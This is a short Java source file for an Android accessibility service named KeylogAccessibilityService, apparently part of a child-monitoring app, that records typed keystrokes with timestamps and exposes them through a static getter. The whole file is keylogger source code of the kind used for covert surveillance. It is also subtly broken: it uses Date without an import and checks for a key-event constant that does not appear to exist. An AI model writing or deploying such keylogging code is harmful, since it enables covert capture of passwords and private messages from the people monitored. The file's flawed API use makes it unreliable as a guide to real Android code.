package com.xyz.child;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import java.util.ArrayList;
import java.util.List;

public class KeylogAccessibilityService extends AccessibilityService {
    private static List<String> keyLogs = new ArrayList<>();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_KEY_EVENT) {
            String key = event.getText().toString();
            keyLogs.add("Key: " + key + " Time: " + new Date());
            if (keyLogs.size() > 100) { // Limit storage
                keyLogs.remove(0);
            }
        }
    }

    @Override
    public void onInterrupt() {}

    public static String getKeyLogs() {
        StringBuilder logs = new StringBuilder();
        for (String log : keyLogs) {
            logs.append(log).append("\n");
        }
        return logs.toString();
    }
}